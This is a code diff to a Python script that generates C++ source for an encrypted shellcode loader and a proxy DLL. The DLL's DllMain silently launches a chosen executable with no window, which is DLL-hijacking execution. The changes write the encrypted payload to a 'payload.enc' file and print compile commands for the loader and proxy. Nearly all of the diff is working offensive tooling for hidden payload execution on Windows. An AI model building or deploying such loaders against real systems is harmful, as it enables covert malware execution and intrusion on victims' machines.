@@ -6,6 +6,7 @@ from Crypto.Hash import MD5
 from Crypto.Cipher import AES
 from base64 import b64encode
 from string import Template
+import re
 
 createLoader = False
 createProxy = True
@@ -13,6 +14,7 @@ cppScriptPath = ""
 ErrorSign = "\033[33m[!]\033[0m"
 Success = "\033[32m[+]\033[0m"
 Status = "\033[94m[*]\033[0m"
+batstarter = False
 
 usage = f"""
 
@@ -66,7 +68,7 @@ if not batstarter:
         if len(sys.argv) > 4: sys.exit(usage)
 
     loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"
-    finalProxyName = f'{ os.path.basename(cppScriptPath.strip(".dll"))} - COMPILE TO DLL.cpp'
+    finalProxyName = f'{ os.path.basename(cppScriptPath)} - COMPILE TO DLL.cpp'
 
     if dllPath == "null" and exepath == "null":
         createProxy = False
@@ -88,8 +90,8 @@ def formatCPP(data, key, cipherType):
     chunk_size = 16 * 4  # 16 bytes each line * 4 chars/byte (including \x)
 
     lines = [shellcode[i:i + chunk_size] for i in range(0, len(shellcode), chunk_size)]
-    shellcode = "unsigned char enc[] =\n"
-    shellcode += "\"" + "\"\n\"".join(lines) + "\";"
+    shellcode = ""
+    shellcode += "\n".join(lines)
     return shellcode
 
 batstarter = """
@@ -161,6 +163,8 @@ shellCodeLoader = """
 #include <windows.h>
 #include <iostream>
 #include <vector>
+#include <fstream>
+#include <string>
 
 static LPVOID g_alloc = nullptr;
 static SIZE_T g_allocSize = 0;
@@ -279,11 +283,12 @@ int WINAPI WinMain(
 """
 
 cppScript = """
-#include "pch.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <fstream>
 #include <windows.h>
+#include <string>
+#include <vector>
 
 #define _CRT_SECURE_NO_DEPRECATE
 #pragma warning (disable : 4996)
@@ -293,21 +298,40 @@ PRAGMA_COMMENTS
 HMODULE hReal = nullptr;
 
 // richtige Signatur: WINAPI (entspricht LPTHREAD_START_ROUTINE)
+
+
 DWORD WINAPI StartProcess(LPVOID lpParameter)
 {
+
+    const char* tmpl = "PATH_TO_EXE";
+
+    // First call to get required buffer size
+    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
+    if (needed == 0) {
+        return false;
+    }
+
+    std::vector<char> expanded(needed);
+    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
+        return false;
+    }
+
+    std::string scriptPath = expanded.data();
+
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    // Vollständiger Pfad zur EXE
-    LPCWSTR exePath = L"PATH_TO_EXE";
+    std::wstring wScriptPath(scriptPath.begin(), scriptPath.end());
+    std::vector<wchar_t> cmd(wScriptPath.begin(), wScriptPath.end());
+    cmd.push_back(L'\\0'); // Mutable buffer req.
 
     BOOL ok = CreateProcessW(
-        exePath,        // lpApplicationName (sicher, wenn voller Pfad)
-        nullptr,        // lpCommandLine (NULL -> kein args)
+        nullptr,        // let CreateProcess parse command line
+        cmd.data(),     // modifiable buffer
         nullptr,
         nullptr,
         FALSE,
-        0,
+        CREATE_NO_WINDOW,
         nullptr,
         nullptr,
         &si,
@@ -316,7 +340,7 @@ DWORD WINAPI StartProcess(LPVOID lpParameter)
 
     if (!ok) {
         DWORD err = GetLastError();
-        wprintf(L"CreateProcessW failed: %lu\n", err);
+        wprintf(L"CreateProcessW failed: %lu\\n", err);
         return err;
     }
 
@@ -355,7 +379,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         // StartProcess hat kompatible Signatur (LPTHREAD_START_ROUTINE)
         if (!QueueUserWorkItem(StartProcess, nullptr, WT_EXECUTEDEFAULT)) {
             // Fallback: nichts tun oder Fehlerloggen
-            wprintf(L"QueueUserWorkItem failed: %lu\n", GetLastError());
+            wprintf(L"QueueUserWorkItem failed: %lu\\n", GetLastError());
         }
         break;
     }
@@ -372,6 +396,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     return TRUE;
 }
 """
+
 
 
 #======================================================================================================
@@ -400,6 +425,9 @@ if __name__ == '__main__':
     if createLoader:
         print(f"{Status} Encrypted shellcode size: [{len(transformedShellcode)}] bytes")
         shellcode = formatCPP(transformedShellcode, masterKey, cipherType)
+        with open(os.path.join(os.path.dirname(cppScriptPath), "payload.enc"), "w", encoding="utf-8") as f:
+            f.write(shellcode)
+        print(f"{Status} Shellcode written to \"payload.enc\"")
     print("")
 
     if createProxy:
@@ -457,14 +485,14 @@ if __name__ == '__main__':
         print(f"{Status} C++ Batstarter script written to './batstarter.cpp'\n{Status} Compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib /SUBSYSTEM:WINDOWS")
 
     if createProxy:
-        loaderName = f'{ os.path.basename(exepath.strip(".dll"))} - COMPILE TO EXE.cpp'
+        loaderName = f'{ os.path.basename(exepath)} - COMPILE TO EXE.cpp'
         with open(os.path.join(os.path.dirname(cppScriptPath), finalProxyName), "w", encoding="utf-8") as f:
             f.write(dllTemplate)
-        print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}")
+        print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}\n{Status} Compile with: cl /LD /EHsc /std:c++17 \"{os.path.abspath(finalProxyName)}\"")
     elif cppScriptPath:
         loaderName = os.path.basename(cppScriptPath)
     
     if createLoader:
         with open(os.path.join(os.path.dirname(cppScriptPath), loaderName), "w", encoding="utf-8") as f:
             f.write(shellCodeLoader)
-        print(f"{Status} C++ proxy script written to {os.path.abspath(loaderName)}")
+        print(f"{Status} C++ Loader script written to {os.path.abspath(loaderName)}")
